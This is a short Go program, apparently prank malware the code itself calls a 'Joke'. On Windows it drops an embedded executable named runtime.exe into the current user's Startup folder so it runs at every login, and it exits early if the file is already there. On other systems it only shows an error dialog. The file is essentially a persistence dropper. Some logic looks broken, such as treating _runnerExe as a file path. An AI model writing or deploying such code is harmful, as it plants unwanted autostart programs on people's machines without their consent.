package main

import (
	"io/ioutil"
	"os"
	"runtime"

	"github.com/gen2brain/dlgs"
)

func main() {
	download()
}

func download() {
	if runtime.GOOS == "windows" {
		user := os.Getenv("USERNAME")
		if fileExists("/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/runtime.exe") {
			os.Exit(69)
		} else {
			file := string(_runnerExe)
			exe, _ := ioutil.ReadFile(file)
			ioutil.WriteFile("/Users/"+user+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/runtime.exe", exe, 777)
		}
	} else {
		dlgs.Warning("ERROR", "This Joke is not compatible with linux yet")
	}
}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}
